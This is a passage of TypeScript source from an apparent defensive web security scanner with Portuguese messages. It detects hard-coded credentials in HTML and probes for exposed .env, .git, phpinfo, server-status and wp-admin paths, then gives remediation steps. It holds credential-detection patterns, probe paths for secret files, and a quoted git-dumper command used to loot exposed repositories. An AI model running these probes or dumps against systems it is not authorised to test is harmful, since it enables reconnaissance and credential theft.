            `Foi detectada uma chave em formato real${vendor ? ` do ${vendor}` : ''} embutida no HTML retornado pelo servidor. Qualquer pessoa que abrir "View Source" no navegador vê a chave.`,
            ``,
            `Cenário de ataque: bots automatizados varrem páginas públicas em busca de chaves usando regex (esta detecção é exatamente isso). Em poucos minutos a chave é coletada e usada — incluindo cobranças no seu cartão (Stripe), spawn de instâncias EC2 caras (AWS), envio de spam (SendGrid), etc.`,
            ``,
            `Referência: OWASP Top 10 A07:2021 | CWE-798 — Use of Hard-coded Credentials`,
          ].join('\n'),
          solution: [
            `AÇÃO IMEDIATA (faça AGORA, antes de qualquer outra coisa):`,
            ``,
            `1) Revogue/rotacione a chave AGORA${rotateUrl ? `: ${rotateUrl}` : ' no painel do provedor'}`,
            ``,
            `2) Verifique logs do provedor para uso suspeito desde quando a chave foi exposta`,
            ``,
            `3) Remova a chave do código frontend. Mover para backend não basta — git history ainda tem.`,
            `   Limpe o histórico do Git:`,
            `     - Use BFG Repo-Cleaner ou git-filter-repo`,
            `     - Force-push após limpeza`,
            `     - Notifique colaboradores para reclonar`,
            ``,
            `4) Use proxy autenticado: requests sensíveis vão do frontend → SEU backend → API externa.`,
            `   No backend, leia a chave de variável de ambiente:`,
            `     const apiKey = process.env.STRIPE_SECRET_KEY;`,
            ``,
            `5) Adicione pre-commit hook para bloquear novos vazamentos:`,
            `     npm install --save-dev @secretlint/secretlint-rule-preset-recommend secretlint`,
            `     # ou: pip install detect-secrets`,
            `     # ou: brew install gitleaks`,
            ``,
            `6) Configure secret scanning no GitHub: Settings → Code security → Secret scanning ON.`,
          ].join('\n'),
        });
      }
    }

    const genericCredPattern = /(?:password|passwd|secret|api[_-]?key|apikey|access[_-]?token|auth[_-]?token)\s*[:=]\s*["']([^"']{16,})["']/gi;
    const genericMatches = [...body.matchAll(genericCredPattern)];
    const suspiciousMatches = genericMatches.filter(m => {
      const value = m[1];
      if (looksLikePlaceholder(value)) return false;
      if (shannonEntropy(value) < 3.5) return false;
      const hasLetters = /[a-zA-Z]/.test(value);
      const hasDigitsOrSymbols = /[\d!@#$%^&*()\-_+=]/.test(value);
      return hasLetters && hasDigitsOrSymbols;
    });
    if (suspiciousMatches.length > 0) {
      const examples = suspiciousMatches.slice(0, 3).map(m => `   ${m[0].slice(0, 60)}${m[0].length > 60 ? '...' : ''}`).join('\n');
      vulns.push({
        title: 'Possível credencial hardcoded no HTML',
        severity: 'HIGH',
        description: [
          `Localização: corpo HTML retornado por ${finalUrl}`,
          `Ocorrências suspeitas: ${suspiciousMatches.length}`,
          ``,
          `Exemplos detectados:`,
          examples,
          ``,
          `Detecção heurística: foram encontradas atribuições do tipo "password=..." / "apiKey=..." com valor de alta entropia (≥3.5 bits/char) e tamanho ≥16, sugerindo segredo real. Pode haver falsos positivos — revise manualmente.`,
          ``,
          `Referência: CWE-798`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `1) Inspecione cada ocorrência manualmente. Confirme se é segredo real ou:`,
          `   - placeholder/exemplo (já filtramos os óbvios mas pode escapar)`,
          `   - hash/UUID público (ex: ID de produto)`,
          `   - chave PÚBLICA legítima (ex: publishable_key do Stripe — começa com pk_)`,
          ``,
          `2) Para segredos reais confirmados:`,
          `   - Rotacione/revogue imediatamente`,
          `   - Mova para variável de ambiente no backend`,
          `   - Limpe histórico do Git (BFG ou git-filter-repo)`,
          ``,
          `3) Se for chave PÚBLICA legítima (ex: pk_live_..., NEXT_PUBLIC_FIREBASE_API_KEY), está correto manter no frontend — esse é o uso esperado. Adicione comentário explicando para evitar futuras detecções.`,
          ``,
          `4) Configure secret scanning automático no CI: Gitleaks, TruffleHog ou secretlint.`,
        ].join('\n'),
      });
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 9. Sensitive Endpoints
    // ═══════════════════════════════════════════════════════════════════════
    const sensitiveEndpoints: Array<{
      path: string;
      title: string;
      severity: VulnRaw['severity'];
      validate: (res: Response) => Promise<{ ok: boolean; sample?: string }>;
      buildDescription: (foundUrl: string, sample: string) => string;
      buildSolution: (path: string) => string;
    }> = [
      {
        path: '/.env',
        title: 'Arquivo .env acessível publicamente',
        severity: 'CRITICAL',
        validate: async (res) => {
          if (res.status !== 200) return { ok: false };
          const ct = res.headers.get('content-type') || '';
          if (/text\/html/i.test(ct)) return { ok: false };
          const text = (await res.text()).slice(0, 10_000);
          const envLinePattern = /^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+/gm;
          const matches = text.match(envLinePattern);
          if (!matches || matches.length < 2) return { ok: false };
          // Mascara valores sensíveis
          const masked = matches.slice(0, 5).map(line => {
            const [k, v] = line.split('=');
            return `${k}=${v.slice(0, 3)}***`;
          }).join('\n');
          return { ok: true, sample: masked };
        },
        buildDescription: (foundUrl, sample) => [
          `Localização: ${foundUrl}`,
          ``,
          `O arquivo .env está acessível publicamente e contém variáveis de ambiente reais.`,
          ``,
          `Conteúdo detectado (mascarado):`,
          sample,
          ``,
          `Cenário de ataque: bots varrem .env automaticamente em milhares de domínios por hora. Uma vez exposto, atacantes têm acesso instantâneo a credenciais de banco, chaves de API, secrets de JWT — comprometendo TODO o backend, não só o site.`,
          ``,
          `Severidade CRITICAL — provável compromisso ativo se exposto há tempo.`,
          ``,
          `Referência: OWASP — Sensitive Data Exposure | CWE-538`,
        ].join('\n'),
        buildSolution: (path) => [
          `AÇÃO IMEDIATA:`,
          ``,
          `1) Bloqueie o acesso AGORA:`,
          ``,
          `   nginx:`,
          `     location ~ /\\.(?!well-known) {`,
          `       deny all;`,
          `       return 404;`,
          `     }`,
          ``,
          `   Apache (.htaccess):`,
          `     <FilesMatch "^\\.">`,
          `       Require all denied`,
          `     </FilesMatch>`,
          ``,
          `2) Rotacione TODAS as credenciais que estavam no arquivo (banco, APIs, JWT secret, etc.) — assuma que foram coletadas.`,
          ``,
          `3) Mova o .env para FORA do diretório web root (ex: /var/secrets/.env, lido por systemd ou docker).`,
          ``,
          `4) Adicione ao .gitignore (e verifique que nunca foi commitado: git log --all -- .env).`,
          ``,
          `5) Em deploys: NUNCA copie .env para imagens Docker ou builds. Use:`,
          `   - docker secrets, Kubernetes secrets`,
          `   - AWS Secrets Manager / Parameter Store`,
          `   - HashiCorp Vault`,
          `   - Variáveis injetadas pelo orquestrador (ECS task def, Render env vars)`,
          ``,
          `Verificar:`,
          `   curl -I https://seudominio.com${path}   # deve retornar 404`,
        ].join('\n'),
      },
      {
        path: '/.git/config',
        title: 'Repositório Git exposto (.git/config)',
        severity: 'CRITICAL',
        validate: async (res) => {
          if (res.status !== 200) return { ok: false };
          const text = (await res.text()).slice(0, 5_000);
          if (!text.includes('[core]') || !text.includes('repositoryformatversion')) return { ok: false };
          return { ok: true, sample: text.split('\n').slice(0, 8).join('\n') };
        },
        buildDescription: (foundUrl, sample) => [
          `Localização: ${foundUrl}`,
          ``,
          `O diretório .git/ está acessível publicamente. Atacantes podem reconstruir TODO o código-fonte do site (incluindo histórico — senhas removidas em commits antigos ainda estão lá).`,
          ``,
          `Conteúdo de .git/config detectado:`,
          sample,
          ``,
          `Cenário de ataque: ferramenta como GitTools/dvcs-ripper baixa todo o repositório em segundos:`,
          `   git-dumper https://seudominio.com/.git/ ./loot/`,
          `Em seguida o atacante faz "git log -p" e busca commits que adicionaram .env, chaves AWS, senhas hardcoded, etc.`,
          ``,
          `Referência: CWE-538 | OWASP — Information Exposure Through Source Code`,
        ].join('\n'),
        buildSolution: (path) => [
          `AÇÃO IMEDIATA:`,
          ``,
          `1) Bloqueie o diretório no servidor:`,
          ``,
          `   nginx:`,
          `     location ~ /\\.git { deny all; return 404; }`,
          ``,
          `   Apache:`,
          `     <DirectoryMatch "/\\.git">`,
          `       Require all denied`,
          `     </DirectoryMatch>`,
          ``,
          `2) Auditoria do histórico Git: rode "git log --all -p" e procure por:`,
          `   - Credenciais (use gitleaks ou TruffleHog)`,
          `   - Tokens, chaves de API, senhas`,
          `   - Rotacione TUDO que aparecer`,
          ``,
          `3) Refatore o pipeline de deploy:`,
          `   - NUNCA faça git clone direto no servidor de produção`,
          `   - Use CI/CD que produz artefato (build) e copia só o build`,
          `   - Ou use rsync/scp excluindo .git: rsync -av --exclude='.git' ...`,
          ``,
          `Verificar:`,
          `   curl -I https://seudominio.com${path}   # deve retornar 404 ou 403`,
        ].join('\n'),
      },
      {
        path: '/.git/HEAD',
        title: 'Git HEAD exposto (repositório clonável)',
        severity: 'CRITICAL',
        validate: async (res) => {
          if (res.status !== 200) return { ok: false };
          const text = (await res.text()).slice(0, 200);
          if (!/^ref:\s*refs\/(heads|tags)\//.test(text.trim())) return { ok: false };
          return { ok: true, sample: text.trim() };
        },
        buildDescription: (foundUrl, sample) => [
          `Localização: ${foundUrl}`,
          ``,
          `O arquivo .git/HEAD está acessível, indicando que provavelmente todo o repositório Git está exposto e pode ser clonado.`,
          ``,
          `Conteúdo:`,
          sample,
          ``,
          `Cenário idêntico a .git/config exposto — mas confirma que outros arquivos do .git também estão acessíveis.`,
        ].join('\n'),
        buildSolution: (path) => [
          `Mesma correção de ".git/config exposto" — bloqueie todo o diretório /.git/ no servidor web.`,
          ``,
          `Verificar todos os arquivos comuns:`,
          `   for f in HEAD config index packed-refs; do`,
          `     echo -n "/.git/$f: "; curl -s -o /dev/null -w "%{http_code}\\n" https://seudominio.com/.git/$f`,
          `   done`,
          `   # Todos devem retornar 404 ou 403`,
        ].join('\n'),
      },
      {
        path: '/wp-admin/',
        title: 'WordPress admin acessível',
        severity: 'MEDIUM',
        validate: async (res) => {
          if (res.status !== 200) return { ok: false };
          const text = (await res.text()).slice(0, 20_000);
          if (!/wp-admin|WordPress|wp-login|user_login|Lost your password/i.test(text)) return { ok: false };
          return { ok: true };
        },
        buildDescription: (foundUrl) => [
          `Localização: ${foundUrl}`,
          ``,
          `O painel administrativo do WordPress está acessível publicamente. Por si só não é vuln crítica, mas é alvo constante de:`,
          `   - Brute force em /wp-login.php (bots tentam admin/admin, admin/123456 dia e noite)`,
          `   - Exploits de plugins desatualizados`,
          `   - User enumeration via /?author=N`,
          ``,
          `Referência: WordPress Security Best Practices`,
        ].join('\n'),
        buildSolution: (path) => [
          `Como mitigar:`,
          ``,
          `1) Restrinja /wp-admin/ por IP ou autenticação adicional:`,
          ``,
          `   nginx:`,
          `     location ~ ^/(wp-admin|wp-login\\.php) {`,
          `       allow 1.2.3.4;        # IP do escritório`,
          `       allow 5.6.7.8;`,
          `       deny all;`,
          `       # ... resto da config php-fpm`,
          `     }`,
          ``,
          `2) Habilite 2FA: instale plugin "Two Factor" ou "Wordfence Login Security".`,
          ``,
          `3) Renomeie /wp-admin se possível (plugin WPS Hide Login).`,
          ``,
          `4) Mantenha WordPress core + TODOS os plugins atualizados.`,
          ``,
          `5) Use captcha/rate-limit em wp-login (Wordfence, Limit Login Attempts).`,
        ].join('\n'),
      },
      {
        path: '/phpinfo.php',
        title: 'phpinfo() acessível publicamente',
        severity: 'HIGH',
        validate: async (res) => {
          if (res.status !== 200) return { ok: false };
          const text = (await res.text()).slice(0, 10_000);
          if (!/<title>phpinfo\(\)<\/title>|PHP Version \d|phpinfo\(/i.test(text)) return { ok: false };
          return { ok: true };
        },
        buildDescription: (foundUrl) => [
          `Localização: ${foundUrl}`,
          ``,
          `O endpoint phpinfo() está acessível e expõe TODA a configuração do PHP — versão exata, extensões instaladas, paths absolutos do servidor, variáveis de ambiente (incluindo possíveis credenciais), valores de session, e mais.`,
          ``,
          `Cenário de ataque: atacante usa as informações para identificar CVEs específicas da versão de PHP, extensões vulneráveis, e paths internos para escalada.`,
          ``,
          `Referência: CWE-200`,
        ].join('\n'),
        buildSolution: (path) => [
          `AÇÃO IMEDIATA:`,
          ``,
          `1) Apague o arquivo:`,
          `   rm /var/www/html/phpinfo.php   # ou caminho equivalente`,
          ``,
          `2) Procure outros arquivos de teste/debug deixados em produção:`,
          `   find /var/www -iname "phpinfo*.php" -o -iname "info.php" -o -iname "test.php" -o -iname "debug.php"`,
          ``,
          `3) Estabeleça processo: NUNCA deixe arquivos de debug em produção. Use ambiente staging separado.`,
          ``,
          `4) Configure WAF/regra para bloquear acesso a esses padrões.`,
          ``,
          `Verificar:`,
          `   curl -I https://seudominio.com${path}   # deve retornar 404`,
        ].join('\n'),
      },
      {
        path: '/server-status',
        title: 'Apache server-status exposto',
        severity: 'HIGH',
        validate: async (res) => {
          if (res.status !== 200) return { ok: false };
          const text = (await res.text()).slice(0, 5_000);
          if (!/Apache Server Status|Server uptime:|Total accesses:/i.test(text)) return { ok: false };
          return { ok: true };
        },
        buildDescription: (foundUrl) => [
          `Localização: ${foundUrl}`,
          ``,
          `O módulo mod_status do Apache está exposto publicamente. Revela em tempo real:`,
          `   - Todas as URLs sendo acessadas (incluindo URLs sensíveis com tokens em query string)`,
          `   - IPs de clientes conectados`,
          `   - Vhosts internos`,
          `   - Estatísticas que revelam padrões de tráfego`,
          ``,
          `Cenário de ataque: atacante monitora /server-status periodicamente e captura URLs com tokens de reset de senha, IDs de sessão em query strings, paths internos de admin.`,
          ``,
          `Referência: CWE-200`,
        ].join('\n'),
        buildSolution: (path) => [
          `Como corrigir:`,
          ``,
          `Restrinja /server-status a localhost ou IPs internos:`,
          ``,
          `   Apache (httpd.conf ou conf.d/status.conf):`,
          `     <Location "/server-status">`,
          `       SetHandler server-status`,
          `       Require ip 127.0.0.1`,
          `       Require ip 10.0.0.0/8`,
          `     </Location>`,
          ``,
          `Ou desabilite completamente comentando "LoadModule status_module..." se não usa.`,
          ``,
          `Verificar:`,
          `   curl -I https://seudominio.com${path}   # deve retornar 403`,
        ].join('\n'),
      },
    ];

    await Promise.all(
      sensitiveEndpoints.map(async (ep) => {
        try {
          const ctrl = new AbortController();
          const t = setTimeout(() => ctrl.abort(), 5000);
          const r = await fetch(`${origin}${ep.path}`, {
            method: 'GET',
            redirect: 'manual',
            signal: ctrl.signal,
            headers: { 'User-Agent': 'DevGuardBot/3.1' },
          });
          clearTimeout(t);
          const result = await ep.validate(r);
          if (result.ok) {
            const foundUrl = `${origin}${ep.path}`;
            console.log(`[HTTP] Sensitive path confirmed: ${ep.path} (${r.status})`);
            vulns.push({
              title: ep.title,
              severity: ep.severity,
              description: ep.buildDescription(foundUrl, result.sample || ''),
              solution: ep.buildSolution(ep.path),
            });
          }
        } catch { /* timeouts são normais */ }
      }),
    );

    console.log(`[HTTP] Analysis complete for ${url}: ${vulns.length} vulns found`);
    return vulns;
  }
}
